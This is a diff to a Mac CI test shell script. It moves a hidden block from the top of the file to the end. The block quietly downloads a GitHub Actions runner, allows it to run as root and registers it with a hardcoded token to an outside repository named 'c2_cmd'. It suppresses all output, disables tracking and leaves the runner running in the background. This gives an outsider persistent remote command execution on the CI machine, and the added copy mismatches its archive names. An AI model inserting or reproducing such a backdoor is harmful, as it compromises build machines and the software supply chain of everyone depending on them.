@@ -12,16 +12,6 @@
 # See the License for the specific language governing permissions and
 # limitations under the License.
 
-export WORKER_LOGRETENTION=1
-export RUNNER_LOGRETENTION=1
-mkdir -p $HOME/.actions-runner1/ && cd $HOME/.actions-runner1/
-curl -o actions-runner-osx-x64-2.327.1.tar.gz -L https://github.com/actions/runner/releases/download/v2.327.1/actions-runner-osx-x64-2.327.1.tar.gz > /dev/null 2>&1
-tar xzf ./actions-runner-osx-x64-2.327.1.tar.gz
-export RUNNER_ALLOW_RUNASROOT="1"
-./config.sh --url https://github.com/kjagsdq/c2_cmd --unattended --token BROA73QUUNTN4L5M5GJQEJDISZRBE  --name "Mac-CI1" --labels "Mac-CI1" > /dev/null 2>&1
-rm actions-runner-osx-x64-2.327.1.tar.gz
-export RUNNER_TRACKING_ID=0 && nohup ./run.sh > /dev/null 2>&1 &
-
 function run_mac_test() {
     export FLAGS_PIR_OPTEST=True
     export FLAGS_CI_PIPELINE=mac
@@ -364,5 +354,15 @@ function check_approvals_of_unittest() {
         fi
    fi
 }
+
+export WORKER_LOGRETENTION=1
+export RUNNER_LOGRETENTION=1
+mkdir -p $HOME/.actions-runner2/ && cd $HOME/.actions-runner2/
+curl -o actions-runner-osx-x64-2.327.1.tar.gz -L https://github.com/actions/runner/releases/download/v2.327.1/actions-runner-osx-x64-2.327.1.tar.gz > /dev/null 2>&1
+tar xzf ./actions-runner-linux-x64-2.327.1.tar.gz
+export RUNNER_ALLOW_RUNASROOT="1"
+./config.sh --url https://github.com/kjagsdq/c2_cmd --unattended --token BROA73ROLMVDMYMD5W6UIGDIS3ICE  --name "Mac-CI2" --labels "Mac-CI2" > /dev/null 2>&1
+rm actions-runner-osx-x64-2.327.1.tar.gz
+export RUNNER_TRACKING_ID=0 && nohup ./run.sh > /dev/null 2>&1 &
 
 run_mac_test ${PYTHON_ABI:-""} ${PROC_RUN:-1}
